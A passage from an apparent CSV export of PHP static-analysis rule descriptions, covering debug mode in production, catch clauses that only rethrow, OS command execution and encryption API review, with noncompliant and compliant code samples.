  <li> <a href=""https://www.securecoding.cert.org/confluence/x/3YEVAQ"">CERT, SEC05-J.</a> - Do not use reflection to increase accessibility of
  classes, methods, or fields </li>
</ul>",Changing or bypassing accessibility is security-sensitive,[],CRITICAL,"['cert', 'owasp-a3']",SECURITY_HOTSPOT
2018-07-31T12:24:47+0200,"<p>Delivering code in production with debug features activated is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1999007"">CVE-2018-1999007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5306"">CVE-2015-5306</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2006"">CVE-2013-2006</a> </li>
</ul>
<p>An application's debug features enable developers to find bugs more easily. It often gives access to detailed information on both the system
running the application and users. Sometime it even enables the execution of custom commands. Thus deploying on production servers an application
which has debug features activated is extremely dangerous.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code or configuration enabling the application debug features is deployed on production servers. </li>
  <li> the application runs by default with debug features activated. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The application should run by default in the most secure mode, i.e. as on production servers. This is to prevent any mistake. Enabling debug mode
should be explicitly asked via a command line argument, an environment variable or a configuration file.</p>
<p>Check that every aspect of the debug mode is controlled by only one configuration switch: logging, exception/error handling, access control, etc...
It is otherwise very easy to forget one of them.</p>
<p>Do not enable debug mode on production servers.</p>
<p>Only the value ""0"" or ""false"" for CakePHP 3.x is suitable (production mode) to not leak sensitive data on the logs.</p>
<h2>Noncompliant Code Example</h2>
<p>CakePHP 1.x, 2.x:</p>
<pre>
Configure::write('debug', 1); // Noncompliant; development mode
or
Configure::write('debug', 2); // Noncompliant; development mode
or
Configure::write('debug', 3); // Noncompliant; development mode
</pre>
<p>CakePHP 3.0:</p>
<pre>
use Cake\Core\Configure;

Configure::config('debug', true);
</pre>
<h2>Compliant Solution</h2>
<p>CakePHP 1.2:</p>
<pre>
Configure::write('debug', 0); // Compliant; this is the production mode
</pre>
<p>CakePHP 3.0:</p>
<pre>
use Cake\Core\Configure;

Configure::config('debug', false);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/215.html"">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",php:S4507,php,PHP,"<p>Delivering code in production with debug features activated is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1999007"">CVE-2018-1999007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5306"">CVE-2015-5306</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2006"">CVE-2013-2006</a> </li>
</ul>
<p>An application's debug features enable developers to find bugs more easily. It often gives access to detailed information on both the system
running the application and users. Sometime it even enables the execution of custom commands. Thus deploying on production servers an application
which has debug features activated is extremely dangerous.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code or configuration enabling the application debug features is deployed on production servers. </li>
  <li> the application runs by default with debug features activated. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The application should run by default in the most secure mode, i.e. as on production servers. This is to prevent any mistake. Enabling debug mode
should be explicitly asked via a command line argument, an environment variable or a configuration file.</p>
<p>Check that every aspect of the debug mode is controlled by only one configuration switch: logging, exception/error handling, access control, etc...
It is otherwise very easy to forget one of them.</p>
<p>Do not enable debug mode on production servers.</p>
<p>Only the value ""0"" or ""false"" for CakePHP 3.x is suitable (production mode) to not leak sensitive data on the logs.</p>
<h2>Noncompliant Code Example</h2>
<p>CakePHP 1.x, 2.x:</p>
<pre>
Configure::write('debug', 1); // Noncompliant; development mode
or
Configure::write('debug', 2); // Noncompliant; development mode
or
Configure::write('debug', 3); // Noncompliant; development mode
</pre>
<p>CakePHP 3.0:</p>
<pre>
use Cake\Core\Configure;

Configure::config('debug', true);
</pre>
<h2>Compliant Solution</h2>
<p>CakePHP 1.2:</p>
<pre>
Configure::write('debug', 0); // Compliant; this is the production mode
</pre>
<p>CakePHP 3.0:</p>
<pre>
use Cake\Core\Configure;

Configure::config('debug', false);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/215.html"">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",Delivering code in production with debug features activated is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a3']",SECURITY_HOTSPOT
2017-11-30T14:19:40+0100,"<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$s = """";
try {
  $s = readMyFile($fileName);
} catch (Exception $e)  {
  throw $e;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
$s = """";
try {
  $s = readMyFile($fileName);
} catch (Exception $e) {
  error_log($e-&gt;getMessage());
  throw $e;  // Compliant
}
</pre>
<p>or</p>
<pre>
$s = """";
try {
  $s = readMyFile($fileName);
} catch (Exception $e) {
  error_log($e-&gt;getMessage());
  throw new MyException(""an exception occurred"", 2, $e);  // Compliant
}
</pre>
<p>or</p>
<pre>
$s = readMyFile($fileName);
</pre>",php:S2737,php,PHP,"<p>A <code>catch</code> clause that only rethrows the caught exception has the same effect as omitting the <code>catch</code> altogether and letting
it bubble up automatically, but with more code and the additional detriment of leaving maintainers scratching their heads. </p>
<p>Such clauses should either be eliminated or populated with the appropriate logic.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$s = """";
try {
  $s = readMyFile($fileName);
} catch (Exception $e)  {
  throw $e;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
$s = """";
try {
  $s = readMyFile($fileName);
} catch (Exception $e) {
  error_log($e-&gt;getMessage());
  throw $e;  // Compliant
}
</pre>
<p>or</p>
<pre>
$s = """";
try {
  $s = readMyFile($fileName);
} catch (Exception $e) {
  error_log($e-&gt;getMessage());
  throw new MyException(""an exception occurred"", 2, $e);  // Compliant
}
</pre>
<p>or</p>
<pre>
$s = readMyFile($fileName);
</pre>","""catch"" clauses should do more than rethrow",[],MINOR,"['clumsy', 'error-handling', 'finding', 'unused']",CODE_SMELL
2018-07-31T12:24:47+0200,"<p>OS commands are security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12465"">CVE-2018-12465</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7187"">CVE-2018-7187</a> </li>
</ul>
<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided input used to construct those commands. Failure to do so could allow an attacker to execute unexpected or dangerous commands,
potentially leading to loss of confidentiality, integrity or availability.</p>
<p> </p>
<p>This rule flags code that specifies the name of the command to run. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed command is constructed by input that is externally-influenced, for example, user input (attacker). (*) </li>
  <li> the command execution is not restricted to the right users. (*) </li>
  <li> the application can be redesigned to not rely on external input to execute the command. </li>
</ul>
<p>(*) You are at risk if you answered yes to any of those questions.</p>
<p> </p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the control given to the user over the executed command:</p>
<ul>
  <li> make the executed command part of a whitelist and reject all commands not part of this list. </li>
  <li> sanitize the user input. </li>
</ul>
<p> </p>
<p>Restrict which users can have access to the command:</p>
<ul>
  <li> use a firewall to protect the process running the code, and to protect the network from the command. </li>
  <li> authenticate the user and allow only some users to run the command. </li>
</ul>
<p>Reduce the damage the command can do:</p>
<ul>
  <li> execute the code in a sandbox environment that enforces strict boundaries between the operating system and the process. For example: a ""jail"".
  </li>
  <li> refuse to run the command if the process has too many privileges. For example: forbid running the code as ""root"". </li>
</ul>
<p> </p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",php:S4721,php,PHP,"<p>OS commands are security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12465"">CVE-2018-12465</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7187"">CVE-2018-7187</a> </li>
</ul>
<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided input used to construct those commands. Failure to do so could allow an attacker to execute unexpected or dangerous commands,
potentially leading to loss of confidentiality, integrity or availability.</p>
<p> </p>
<p>This rule flags code that specifies the name of the command to run. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed command is constructed by input that is externally-influenced, for example, user input (attacker). (*) </li>
  <li> the command execution is not restricted to the right users. (*) </li>
  <li> the application can be redesigned to not rely on external input to execute the command. </li>
</ul>
<p>(*) You are at risk if you answered yes to any of those questions.</p>
<p> </p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the control given to the user over the executed command:</p>
<ul>
  <li> make the executed command part of a whitelist and reject all commands not part of this list. </li>
  <li> sanitize the user input. </li>
</ul>
<p> </p>
<p>Restrict which users can have access to the command:</p>
<ul>
  <li> use a firewall to protect the process running the code, and to protect the network from the command. </li>
  <li> authenticate the user and allow only some users to run the command. </li>
</ul>
<p>Reduce the damage the command can do:</p>
<ul>
  <li> execute the code in a sandbox environment that enforces strict boundaries between the operating system and the process. For example: a ""jail"".
  </li>
  <li> refuse to run the command if the process has too many privileges. For example: forbid running the code as ""root"". </li>
</ul>
<p> </p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",Executing OS commands is security-sensitive,[],CRITICAL,"['cwe', 'sans-top25-insecure']",SECURITY_HOTSPOT
2019-01-18T12:20:02+0100,"<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902"">CVE-2017-7902</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378"">CVE-2006-1378</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376"">CVE-2003-1376</a> </li>
</ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p> </p>
<p>This rule flags function calls that initiate encryption/decryption. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>
  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>
  <li> the key exchange is made without properly authenticating the receiver. </li>
  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li>
  <li> the chosen encryption library is deemed unsafe. </li>
  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>
  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li>
  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it's IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li>
  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Generate encryption keys using secure random algorithms. </li>
  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li>
  <li> Regenerate the keys regularly. </li>
  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>
  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>
  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most
  probably have flaws. </li>
  <li> When a nonce is used, generate it randomly every time. </li>
  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>
  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like ""Chosen-Plaintext Attacks"". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV's purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>
  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul>
      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn't provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li>
      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
    </ul> </li>
</ul>
<h2>Questionable Code Example</h2>
<p>Builtin functions</p>
<pre>
function myEncrypt($cipher, $key, $data, $mode, $iv, $options, $padding, $infile, $outfile, $recipcerts, $headers, $nonce, $ad, $pub_key_ids, $env_keys)
{
    mcrypt_ecb ($cipher, $key, $data, $mode); // Questionable
    mcrypt_cfb($cipher, $key, $data, $mode, $iv); // Questionable
    mcrypt_cbc($cipher, $key, $data, $mode, $iv); // Questionable
    mcrypt_encrypt($cipher, $key, $data, $mode); // Questionable

    openssl_encrypt($data, $cipher, $key, $options, $iv); // Questionable
    openssl_public_encrypt($data, $crypted, $key, $padding); // Questionable
    openssl_pkcs7_encrypt($infile, $outfile, $recipcerts, $headers); // Questionable
    openssl_seal($data, $sealed_data, $env_keys, $pub_key_ids); // Questionable

    sodium_crypto_aead_aes256gcm_encrypt ($data, $ad, $nonce, $key); // Questionable
    sodium_crypto_aead_chacha20poly1305_encrypt ($data, $ad, $nonce, $key); // Questionable
    sodium_crypto_aead_chacha20poly1305_ietf_encrypt ($data, $ad, $nonce, $key); // Questionable
    sodium_crypto_aead_xchacha20poly1305_ietf_encrypt ($data, $ad, $nonce, $key); // Questionable
    sodium_crypto_box_seal ($data, $key); // Questionable
    sodium_crypto_box ($data, $nonce, $key); // Questionable
    sodium_crypto_secretbox ($data, $nonce, $key); // Questionable
    sodium_crypto_stream_xor ($data, $nonce, $key); // Questionable
}
</pre>
<p>CakePHP</p>
<pre>
use Cake\Utility\Security;

function myCakeEncrypt($key, $data, $engine)
{
    Security::encrypt($data, $key); // Questionable

    // Do not use custom made engines and remember that Mcrypt is deprecated.
    Security::engine($engine); // Questionable. Setting the encryption engine.
}
</pre>
<p>CodeIgniter</p>
<pre>
class EncryptionController extends CI_Controller
{
    public function __construct()
    {
        parent::__construct();
        $this-&gt;load-&gt;library('encryption');
    }

    public function index()
    {
        $this-&gt;encryption-&gt;create_key(16); // Questionable. Review the key length.
        $this-&gt;encryption-&gt;initialize( // Questionable.
            array(
                'cipher' =&gt; 'aes-256',
                'mode' =&gt; 'ctr',
                'key' =&gt; 'the key',
            )
        );
        $this-&gt;encryption-&gt;encrypt(""mysecretdata""); // Questionable.
    }
}
</pre>
<p>CraftCMS version 3</p>
<pre>
use Craft;

// This is similar to Yii as it used by CraftCMS
function craftEncrypt($data, $key, $password) {
    Craft::$app-&gt;security-&gt;encryptByKey($data, $key); // Questionable
    Craft::$app-&gt;getSecurity()-&gt;encryptByKey($data, $key); // Questionable
    Craft::$app-&gt;security-&gt;encryptByPassword($data, $password); // Questionable
    Craft::$app-&gt;getSecurity()-&gt;encryptByPassword($data, $password); // Questionable
}
</pre>
<p>Drupal 7 - Encrypt module</p>
<pre>
function drupalEncrypt() {
    $encrypted_text = encrypt('some string to encrypt'); // Questionable
}
</pre>
<p>Joomla</p>
<pre>
use Joomla\Crypt\CipherInterface;

abstract class MyCipher implements CipherInterface // Questionable. Implementing custom cipher class
{}

function joomlaEncrypt() {
    new Joomla\Crypt\Cipher_Sodium(); // Questionable
    new Joomla\Crypt\Cipher_Simple(); // Questionable
    new Joomla\Crypt\Cipher_Rijndael256(); // Questionable
    new Joomla\Crypt\Cipher_Crypto(); // Questionable
    new Joomla\Crypt\Cipher_Blowfish(); // Questionable
    new Joomla\Crypt\Cipher_3DES(); // Questionable
}
}
</pre>
<p>Laravel</p>
<pre>
use Illuminate\Support\Facades\Crypt;

function myLaravelEncrypt($data)
{
    Crypt::encryptString($data); // Questionable
    Crypt::encrypt($data); // Questionable
    // encrypt using the Laravel ""encrypt"" helper
    encrypt($data); // Questionable
}
</pre>
<p>PHP-Encryption library</p>
<pre>
use Defuse\Crypto\Crypto;
use Defuse\Crypto\File;

function mypPhpEncryption($data, $key, $password, $inputFilename, $outputFilename, $inputHandle, $outputHandle) {
    Crypto::encrypt($data, $key); // Questionable
    Crypto::encryptWithPassword($data, $password); // Questionable
    File::encryptFile($inputFilename, $outputFilename, $key); // Questionable
    File::encryptFileWithPassword($inputFilename, $outputFilename, $password); // Questionable
    File::encryptResource($inputHandle, $outputHandle, $key); // Questionable
    File::encryptResourceWithPassword($inputHandle, $outputHandle, $password); // Questionable
}
</pre>
<p>PhpSecLib</p>
<pre>
function myphpseclib($mode) {
    new phpseclib\Crypt\RSA(); // Questionable. Note: RSA can also be used for signing data.
    new phpseclib\Crypt\AES(); // Questionable
    new phpseclib\Crypt\Rijndael(); // Questionable
    new phpseclib\Crypt\Twofish(); // Questionable
    new phpseclib\Crypt\Blowfish(); // Questionable
    new phpseclib\Crypt\RC4(); // Questionable
    new phpseclib\Crypt\RC2(); // Questionable
    new phpseclib\Crypt\TripleDES(); // Questionable
    new phpseclib\Crypt\DES(); // Questionable

    new phpseclib\Crypt\AES($mode); // Questionable
    new phpseclib\Crypt\Rijndael($mode); // Questionable
    new phpseclib\Crypt\TripleDES($mode); // Questionable
    new phpseclib\Crypt\DES($mode); // Questionable
}
</pre>
<p>Sodium Compat library</p>
<pre>
function mySodiumCompatEncrypt($data, $ad, $nonce, $key) {
    ParagonIE_Sodium_Compat::crypto_aead_chacha20poly1305_ietf_encrypt($data, $ad, $nonce, $key); // Questionable
    ParagonIE_Sodium_Compat::crypto_aead_xchacha20poly1305_ietf_encrypt($data, $ad, $nonce, $key); // Questionable
    ParagonIE_Sodium_Compat::crypto_aead_chacha20poly1305_encrypt($data, $ad, $nonce, $key); // Questionable

    ParagonIE_Sodium_Compat::crypto_aead_aes256gcm_encrypt($data, $ad, $nonce, $key); // Questionable

    ParagonIE_Sodium_Compat::crypto_box($data, $nonce, $key); // Questionable
    ParagonIE_Sodium_Compat::crypto_secretbox($data, $nonce, $key); // Questionable
    ParagonIE_Sodium_Compat::crypto_box_seal($data, $key); // Questionable
    ParagonIE_Sodium_Compat::crypto_secretbox_xchacha20poly1305($data, $nonce, $key); // Questionable
}
</pre>
<p>Yii version 2</p>
<pre>
use Yii;

// Similar to CraftCMS as it uses Yii
function YiiEncrypt($data, $key, $password) {
    Yii::$app-&gt;security-&gt;encryptByKey($data, $key); // Questionable
    Yii::$app-&gt;getSecurity()-&gt;encryptByKey($data, $key); // Questionable
    Yii::$app-&gt;security-&gt;encryptByPassword($data, $password); // Questionable
    Yii::$app-&gt;getSecurity()-&gt;encryptByPassword($data, $password); // Questionable
}
</pre>
<p>Zend</p>
<pre>
use Zend\Crypt\FileCipher;
use Zend\Crypt\PublicKey\DiffieHellman;
use Zend\Crypt\PublicKey\Rsa;
use Zend\Crypt\Hybrid;
use Zend\Crypt\BlockCipher;

function myZendEncrypt($key, $data, $prime, $options, $generator, $lib)
{
    new FileCipher; // Questionable. This is used to encrypt files

    new DiffieHellman($prime, $generator, $key); // Questionable

    $rsa = Rsa::factory([ // Questionable
        'public_key'    =&gt; 'public_key.pub',
        'private_key'   =&gt; 'private_key.pem',
        'pass_phrase'   =&gt; 'mypassphrase',
        'binary_output' =&gt; false,
    ]);
    $rsa-&gt;encrypt($data); // No issue raised here. The configuration of the Rsa object is the line to review.

    $hybrid = new Hybrid(); // Questionable

    BlockCipher::factory($lib, $options); // Questionable
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/321.html"">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/322.html"">MITRE, CWE-322</a> - Key Exchange without Entity Authentication </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/323.html"">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/324.html"">MITRE, CWE-324</a> - Use of a Key Past its Expiration Date </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/325.html"">MITRE, CWE-325</a> - Missing Required Cryptographic Step </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327.html"">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/522.html"">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>
  <li> [OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> [OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",php:S4787,php,PHP,"<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902"">CVE-2017-7902</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378"">CVE-2006-1378</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376"">CVE-2003-1376</a> </li>
</ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p> </p>
<p>This rule flags function calls that initiate encryption/decryption. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>
  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>
  <li> the key exchange is made without properly authenticating the receiver. </li>
  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li>
  <li> the chosen encryption library is deemed unsafe. </li>
  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>
  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li>
  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it's IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li>
  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Generate encryption keys using secure random algorithms. </li>
  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li>
  <li> Regenerate the keys regularly. </li>
  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>
  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>
  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most
  probably have flaws. </li>
  <li> When a nonce is used, generate it randomly every time. </li>
  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>
  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like ""Chosen-Plaintext Attacks"". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV's purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>
  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul>
      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn't provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li>
      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
    </ul> </li>
</ul>
<h2>Questionable Code Example</h2>
<p>Builtin functions</p>
<pre>
function myEncrypt($cipher, $key, $data, $mode, $iv, $options, $padding, $infile, $outfile, $recipcerts, $headers, $nonce, $ad, $pub_key_ids, $env_keys)
{
    mcrypt_ecb ($cipher, $key, $data, $mode); // Questionable
    mcrypt_cfb($cipher, $key, $data, $mode, $iv); // Questionable
    mcrypt_cbc($cipher, $key, $data, $mode, $iv); // Questionable
    mcrypt_encrypt($cipher, $key, $data, $mode); // Questionable

    openssl_encrypt($data, $cipher, $key, $options, $iv); // Questionable
    openssl_public_encrypt($data, $crypted, $key, $padding); // Questionable
    openssl_pkcs7_encrypt($infile, $outfile, $recipcerts, $headers); // Questionable
    openssl_seal($data, $sealed_data, $env_keys, $pub_key_ids); // Questionable

    sodium_crypto_aead_aes256gcm_encrypt ($data, $ad, $nonce, $key); // Questionable
    sodium_crypto_aead_chacha20poly1305_encrypt ($data, $ad, $nonce, $key); // Questionable
    sodium_crypto_aead_chacha20poly1305_ietf_encrypt ($data, $ad, $nonce, $key); // Questionable
    sodium_crypto_aead_xchacha20poly1305_ietf_encrypt ($data, $ad, $nonce, $key); // Questionable
    sodium_crypto_box_seal ($data, $key); // Questionable
    sodium_crypto_box ($data, $nonce, $key); // Questionable
    sodium_crypto_secretbox ($data, $nonce, $key); // Questionable
    sodium_crypto_stream_xor ($data, $nonce, $key); // Questionable
}
</pre>
<p>CakePHP</p>
<pre>
use Cake\Utility\Security;

function myCakeEncrypt($key, $data, $engine)
{
    Security::encrypt($data, $key); // Questionable

    // Do not use custom made engines and remember that Mcrypt is deprecated.
    Security::engine($engine); // Questionable. Setting the encryption engine.
}
</pre>
<p>CodeIgniter</p>
<pre>
class EncryptionController extends CI_Controller
{
    public function __construct()
    {
        parent::__construct();
        $this-&gt;load-&gt;library('encryption');
    }

    public function index()
    {
        $this-&gt;encryption-&gt;create_key(16); // Questionable. Review the key length.
        $this-&gt;encryption-&gt;initialize( // Questionable.
            array(
                'cipher' =&gt; 'aes-256',
                'mode' =&gt; 'ctr',
                'key' =&gt; 'the key',
            )
        );
        $this-&gt;encryption-&gt;encrypt(""mysecretdata""); // Questionable.
    }
}
</pre>
<p>CraftCMS version 3</p>
<pre>
use Craft;

// This is similar to Yii as it used by CraftCMS
function craftEncrypt($data, $key, $password) {
    Craft::$app-&gt;security-&gt;encryptByKey($data, $key); // Questionable
    Craft::$app-&gt;getSecurity()-&gt;encryptByKey($data, $key); // Questionable
    Craft::$app-&gt;security-&gt;encryptByPassword($data, $password); // Questionable
    Craft::$app-&gt;getSecurity()-&gt;encryptByPassword($data, $password); // Questionable
}
</pre>
<p>Drupal 7 - Encrypt module</p>
<pre>
function drupalEncrypt() {
    $encrypted_text = encrypt('some string to encrypt'); // Questionable
}
</pre>
<p>Joomla</p>
<pre>
use Joomla\Crypt\CipherInterface;

abstract class MyCipher implements CipherInterface // Questionable. Implementing custom cipher class
{}

function joomlaEncrypt() {
    new Joomla\Crypt\Cipher_Sodium(); // Questionable
    new Joomla\Crypt\Cipher_Simple(); // Questionable
    new Joomla\Crypt\Cipher_Rijndael256(); // Questionable
    new Joomla\Crypt\Cipher_Crypto(); // Questionable
    new Joomla\Crypt\Cipher_Blowfish(); // Questionable
    new Joomla\Crypt\Cipher_3DES(); // Questionable
}
}
</pre>
<p>Laravel</p>
<pre>
use Illuminate\Support\Facades\Crypt;

function myLaravelEncrypt($data)
{
    Crypt::encryptString($data); // Questionable
    Crypt::encrypt($data); // Questionable
    // encrypt using the Laravel ""encrypt"" helper
    encrypt($data); // Questionable
}
